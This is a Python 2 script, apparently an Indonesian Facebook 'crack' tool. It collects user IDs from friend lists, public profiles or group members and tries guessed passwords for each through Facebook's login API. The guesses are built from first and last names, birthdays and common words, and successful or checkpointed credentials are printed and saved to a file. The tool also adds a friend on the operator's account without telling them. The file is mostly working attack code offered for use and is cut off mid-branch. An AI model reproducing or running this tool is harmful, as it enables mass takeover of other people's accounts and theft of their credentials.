#!/usr/bin/python2
# coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')
	

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
		
		
logo = """ \033[1;93m๑۩۩๑
\033[1;97m█████████
\033[1;97m█▄█████▄█      \033[1;91m●▬▬▬▬▬▬▬▬▬.👑.▬▬▬▬▬▬▬▬●
\033[1;97m█\033[1;97m▼▼▼▼▼ \033[1;94m- _ --_--\033[1;94m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ 
\033[1;97m█ \033[1;92m \033[1;97m_-_-- -_ --__\033[1;97m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
\033[1;97m█\033[1;97m▲▲▲▲▲\033[1;94m--  - _ --\033[1;94m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ 
\033[1;97m█████████      \033[1;91m●▬▬▬▬▬▬▬▬▬.👑.▬▬▬▬▬▬▬▬●
\033[1;97m ██ ██
\033[1;91m╔══════════════════════════════════════════════╗
\033[1;91m║\033[1;93m• \033[1;97mAUTHOR1 \033[1;93m: \033[1;92mMR.RMX \033[1;91m                           ║
\033[1;91m║\033[1;93m• \033[1;97mAUTHOR2 \033[1;93m: \033[1;92mMR.WAI\033[0m \033[1;91m                           ║
\033[1;91m║\033[1;93m• \033[1;97mGITHUB  \033[1;93m: \033[1;92mhttps://github.com/B4N95AT\033[0m \033[1;91m       ║
\033[1;91m╚══════════════════════════════════════════════╝"""


def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

def siapa():
	os.system('clear')
	nama = raw_input("\033[1;97mSiapa nama kamu ? \033[1;91m: \033[1;92m")
	if nama =="":
		print"\033[1;96m[!] \033[1;91mIsi yang benar"
		time.sleep(1)
		siapa()
	else:
		os.system('clear')
		jalan("\033[1;97mSelamat datang \033[1;92m" +nama+ "\n\033[1;97mTerimakasih telah menggunakan tools milik saya ! \nGunakan sc saya dengan bijak !! ")
		time.sleep(1)
		loginSC()
		
		
def loginSC():
	os.system('clear')
	print"\033[1;97mSilahkan login SC nya dulu bosque\nTanya admin dulu boz qu\n"
	os.system('xdg-open https://wa.me/6282282143238 ')
	username = raw_input("\033[1;96m[•] \033[1;97mUsername \033[1;91m: \033[1;92m")
	password = raw_input("\033[1;96m[•] \033[1;97mPassword \033[1;91m: \033[1;92m")
	if username =="RMX" and password =="WAI":
		print"\033[1;96m[✓] \033[1;92mLOGIN SUCCESS"
		time.sleep(1)
		login()
	else:
		print"\033[1;96m[!] \033[1;91mSalah!!"
		time.sleep(1)
                loginSC()

def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 42 * '\x1b[1;96m='
        print '\x1b[1;96m[\xe2\x98\x86] \x1b[1;93mLOGIN AKUN FACEBOOK ANDA \x1b[1;96m[\xe2\x98\x86]'
        id = raw_input('\x1b[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
        pwd = raw_input('\x1b[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;96m[!] \x1b[1;91mTidak ada koneksi'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mLogin Berhasil'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;96m[!] \x1b[1;91mTidak ada koneksi'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;96m[!] \x1b[1;91mPassword/Email salah'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
			
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
		keluar()
	os.system("clear")
	print logo
	print 48*"\033[1;94m═"
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Nama \033[1;91m: \033[1;92m"+nama+"\033[1;97m                  "
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
	print 48*"\033[1;94m═"
	print "\x1b[1;97m1.\x1b[1;93m Start hacking  "
	print "\x1b[1;97m2.\x1b[1;93m Informasi akun                "
	print "\n\x1b[1;91m0.\x1b[1;91m EXIT        "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		informasi()
	elif unikers =="0":
		os.system('clear')
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		pilih()
		
		
def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 48*"\033[1;94m═"
	print "\x1b[1;97m1.\x1b[1;93m Crack dari daftar teman"
	print "\x1b[1;97m2.\x1b[1;93m Crack dari public"
	print "\n\x1b[1;91m0.\x1b[1;91m Kembali"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print 48*"\033[1;94m═"
		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print 48*"\033[1;94m═"
		idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID public \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
			super()
		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		print 48*"\033[1;94m═"
		idg=raw_input('\033[1;96m[+] \033[1;93mMasukan ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan"
			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
			super()
		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
		s=json.loads(re.text)
		for p in s['data']:
			id.append(p['id'])
	elif peak =="4":
		os.system('clear')
		print logo
		print 48*"\033[1;94m═"
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan nama file  \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;96m[!] \x1b[1;91mFile tidak ditemukan'
			raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		pilih_super()
	
	print "\033[1;96m[+] \033[1;93mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print 48*"\033[1;94m═"
	print('\x1b[1;96m[\x1b[1;91m!\x1b[1;96m] \x1b[1;93mJika 5 menit tidak ada hasil ')
	print('\x1b[1;96m[\x1b[1;91m!\x1b[1;96m] \x1b[1;93mMatikan data 2 detik lalu hidupkan')
	print('\x1b[1;96m[\x1b[1;91m!\x1b[1;96m] \x1b[1;93mCepat atau lambat tergantung jaringan anda!')
	print 48*"\033[1;94m═"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;91m[✓] \x1b[1;92mBERHASIL'
				print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
				print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
				print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass1 + '\n'
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;91m[✖] \x1b[1;93mCEKPOINT'
					print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
					print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
					print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass1 + '\n'
					cek = open("out/super_cp.txt", "a")
					cek.write("ID:" +user+ " Pw:" +pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;91m[✓] \x1b[1;92mBERHASIL'
						print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
						print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
						print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass2 + '\n'
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;91m[✖] \x1b[1;93mCEKPOINT'
							print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
							print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
							print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass2 + '\n'
							cek = open("out/super_cp.txt", "a")
							cek.write("ID:" +user+ " Pw:" +pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['last_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;91m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass3 + '\n'
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;91m[✖] \x1b[1;93mCEKPOINT'
									print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
									print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
									print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass3 + '\n'
									cek = open("out/super_cp.txt", "a")
									cek.write("ID:" +user+ " Pw:" +pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = 'Bangsat'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;91m[✓] \x1b[1;92mBERHASIL'
										print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
										print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
										print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass4 + '\n'
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;91m[✖] \x1b[1;93mCEKPOINT'
											print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
											print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
											print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass4 + '\n'
											cek = open("out/super_cp.txt", "a")
											cek.write("ID:" +user+ " Pw:" +pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											birthday = b['birthday']
											pass5 = birthday.replace('/', '')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;91m[✓] \x1b[1;92mBERHASIL'
												print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
												print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
												print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass5 + '\n'
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;91m[✖] \x1b[1;93mCEKPOINT'
													print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
													print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
													print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass5 + '\n'
													cek = open("out/super_cp.txt", "a")
													cek.write("ID:" +user+ " Pw:" +pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'Bangladesh'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;91m[✓] \x1b[1;92mBERHASIL'
														print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
														print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
														print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass6 + '\n'
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91m[✖] \x1b[1;93mCEKPOINT'
															print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
															print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
															print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass6 + '\n'
															cek = open("out/super_cp.txt", "a")
															cek.write("ID:" +user+ " Pw:" +pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'pakistan123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;91m[✓] \x1b[1;92mBERHASIL'
																print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
																print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
																print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass7 + '\n'
																oks.append(user + pass7)
															else:
																if 'www.facebook.com' in q['error_msg']:
																	print '\x1b[1;91m[✖] \x1b[1;93mCEKPOINT'
																	print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
																	print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
																	print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass7 + '\n'
																	cek = open ("out/super_cp.txt","a")
																	cek.write("ID:" +user+ " Pw:" +pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	pass8 = 'indonesia'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	q = json.load(data)
																	if 'access_token' in q:
																		print '\x1b[1;91m[✓] \x1b[1;92mBERHASIL'
																		print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
																		print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
																		print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass7 + '\n'
																	else:
																		if 'www.facebook.com' in q['error_msg']:
																			print '\x1b[1;91m[✖] \x1b[1;93mCEKPOINT'
																			print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
																			print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
																			print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass8 + '\n'
																			cek = open("out/super_cp.txt","a")
																			cek.write('ID:'+user+'pw:'+pass8+'\n')
																			cek.close()
																			cekpoint.append(user+pass8)
																		else:
																			pass9 = 'garena'
																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																			q = json.load(data)
																			if 'access_token' in q:
																				print '\x1b[1;91m[✓] \x1b[1;92mBERHASIL'
																				print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
																				print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
																				print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass9 + '\n'
																				oks.append(user+pass9)
																			else:
																				if 'www.facebook.com' in q['error_msg']:
																					print '\x1b[1;91m[✖] \x1b[1;93mCEKPOINT'
																					print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
																					print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
																					print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass9 + '\n'
																					cek = open("out/super_cp.txt","a")
																					cek.write('ID:'+user+'pw:'+pass9+'\n')
																					cek.close()
																					cekpoint.append(user+pass9)
																				else:
																					pass10 = 'anjing'
																					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																					q = json.load(data)
																					if 'access_token' in q:
																						print '\x1b[1;91m[✓] \x1b[1;92mBERHASIL'
																						print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
																						print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
																						print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass10 + '\n'
																						oks.append(user+pass10)
																					else:
																						if 'www.facebook.com' in q['error_msg']:
																							print '\x1b[1;91m[✖] \x1b[1;93mCEKPOINT'
																							print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
																							print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
																							print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass10 + '\n'
																						else:
																							p1 = b['last_name'] + 'akter'
																							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(p1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																							q = json.load(data)
																							if 'access_token' in q:
																								print '\x1b[1;91m[✓] \x1b[1;92mBERHASIL'
																								print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
																								print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
																								print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + p1 + '\n'
																								oks.append(user + p1)
																							else:
																								if 'www.facebook.com' in q['error_msg']:
																									print '\x1b[1;91m[✖] \x1b[1;93mCEKPOINT'
																									print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
																									print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
																									print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + p1 + '\n'
																									cek = open("out/super_cp.txt","a")
																									cek.write('ID:'+user+'pw:'+p1+'\n')
																									cek.close()
																									cekpoint.append(user+p1)
																								else:
																									p2 = 'sayang'
																									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(p2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																									q = json.load(data)
																									if 'access_token' in q:
																										print '\x1b[1;91m[✓] \x1b[1;92mBERHASIL'
																										print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
																										print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
																										print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + p2 + '\n'
																										oks.append(user + p2)
																									else:
																										if 'www.facebook.com' in q['error_msg']:
																											print '\x1b[1;91m[✖] \x1b[1;93mCEKPOINT'
																											print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
																											print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
																											print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + p2 + '\n'
																											cek = open("out/super_cp.txt","a")
																											cek.write("ID:"+ user +"pw:"+ p2 +"\n")
																											cek.close()
																											cekpoint.append(user + p2)
																										else:
																											p3 = 'freefire'
																											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(p3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																											q = json.load(data)
																											if 'access_token' in q:
																												print '\x1b[1;91m[✓] \x1b[1;92mBERHASIL'
																												print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
																												print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
																												print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + p3 + '\n'
																												oks.append(user+ps3)
																											else:
																												if 'www.facebook.com' in q:
																													print '\x1b[1;91m[✖] \x1b[1;93mCEKPOINT'
																													print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
																													print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
																													print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + p3 + '\n'
